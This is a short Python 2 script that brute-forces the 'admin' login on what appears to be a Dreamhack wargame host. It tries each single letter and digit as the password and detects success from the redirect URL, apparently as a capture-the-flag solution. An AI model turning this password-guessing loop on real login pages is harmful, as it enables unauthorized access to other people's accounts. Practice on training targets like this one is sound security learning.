import urllib
import urllib2

url = "http://host1.dreamhack.games:13087/login"
user_login = "admin" 

passwords = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'

for password in passwords:
    values = {'username': user_login, 'password': password} 

    data = urllib.urlencode(values) 

    print(data) 

    request = urllib2.Request(url, data)
    response = urllib2.urlopen(request)

    print response.geturl() 

    try:
        idx = response.geturl().index('admin') 
        
    except:
        idx = 0

    if (idx > 0):
        print "##################success############### ["+password+"]"
        break
    else:
        print "##################fail#################["+password+"]"
